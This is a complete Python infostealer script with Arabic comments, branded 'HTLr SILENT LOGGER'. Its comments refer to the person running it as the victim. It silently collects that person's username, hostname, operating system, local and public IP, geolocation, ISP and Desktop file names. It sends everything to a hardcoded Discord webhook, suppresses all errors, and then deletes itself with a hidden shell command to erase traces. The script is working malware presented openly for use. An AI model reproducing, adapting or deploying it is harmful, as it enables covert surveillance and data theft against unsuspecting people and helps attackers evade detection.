import os
import sys
import platform
import socket
import json
import subprocess
import time
import urllib.request
from datetime import datetime

# --- إعداداتك الخاصة (الويبهوك حقك) ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE"
TAG = "#HTLr"
MSG_FOOTER = "Z7F LINK TRACK | DENGER ☢️"

def send_to_discord(embed_data):
    """دالة إرسال البيانات باستخدام urllib (مدمجة في بايثون)"""
    payload = {
        "username": "HTLr SILENT LOGGER",
        "embeds": [embed_data]
    }
    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
    try:
        with urllib.request.urlopen(req) as response:
            pass
    except Exception as e:
        # لو تبي تشوف الخطأ في جهازك وقت التجربة فك التعليق عن السطر اللي تحت
        # print(f"Error: {e}")
        pass

def capture_intel():
    """جمع كل المعلومات الممكنة بصمت"""
    intel = {}
    
    # 1. معلومات الجهاز والنظام
    intel['user'] = os.getlogin() if os.name == 'nt' else os.getenv('USER', 'Unknown')
    intel['pc_name'] = socket.gethostname()
    intel['os'] = f"{platform.system()} {platform.release()}"
    intel['ip_local'] = socket.gethostbyname(intel['pc_name'])
    
    # 2. جلب الآيبي الخارجي والموقع (باستخدام urllib)
    try:
        with urllib.request.urlopen('http://ip-api.com/json/') as response:
            geo = json.loads(response.read().decode())
            intel['pub_ip'] = geo.get('query', 'N/A')
            intel['loc'] = f"{geo.get('city')}, {geo.get('country')}"
            intel['isp'] = geo.get('isp', 'N/A')
    except:
        intel['pub_ip'] = "N/A"
        intel['loc'] = "Unknown"
        intel['isp'] = "N/A"

    # 3. سحب قائمة ملفات سطح المكتب (أهم زلات الضحية)
    try:
        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
        if os.path.exists(desktop_path):
            files = os.listdir(desktop_path)
            intel['files'] = "\n".join(files[:20]) # أول 20 ملف
        else:
            intel['files'] = "Desktop path not found"
    except:
        intel['files'] = "Access Denied"

    return intel

def self_destruct():
    """المهمة الانتحارية: حذف الملف بعد الإرسال"""
    path = os.path.abspath(sys.argv[0])
    try:
        if os.name == 'nt': # Windows
            # أمر حذف صامت بعد 3 ثواني
            cmd = f"timeout /t 3 & del /f /q \"{path}\""
            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else: # Linux / Mac / Mobile
            os.remove(path)
    except:
        pass

def main():
    # الأداة تعمل في الخلفية بصمت
    try:
        # 1. جمع المعلومات
        data = capture_intel()
        
        # 2. تجهيز الإيمبد الفخم
        embed = {
            "title": f"⚡ صيدة جديدة وصلت! [{TAG}] ⚡",
            "description": "تم اختراق معلومات الضحية بنجاح بصمت تام.",
            "color": 16711680, # أحمر
            "fields": [
                {"name": "👤 الضحية", "value": f"```User: {data['user']}\nPC: {data['pc_name']}```", "inline": True},
                {"name": "🌐 المعلومات الشبكية", "value": f"```IP: {data['pub_ip']}\nLoc: {data['loc']}```", "inline": True},
                {"name": "💻 نظام التشغيل", "value": f"```{data['os']}```", "inline": False},
                {"name": "📡 شركة الاتصال (ISP)", "value": f"```{data['isp']}```", "inline": False},
                {"name": "📂 ملفات سطح المكتب المختفية", "value": f"```\n{data['files'][:800]}```", "inline": False}
            ],
            "footer": {"text": f"{MSG_FOOTER} | {datetime.now().strftime('%H:%M:%S')}"}
        }
        
        # 3. الإرسال للويبهوك
        send_to_discord(embed)
        
    except Exception:
        pass
    
    # 4. الانتحار (حذف الملف)
    time.sleep(1)
    self_destruct()
    sys.exit()

if __name__ == "__main__":
    main()
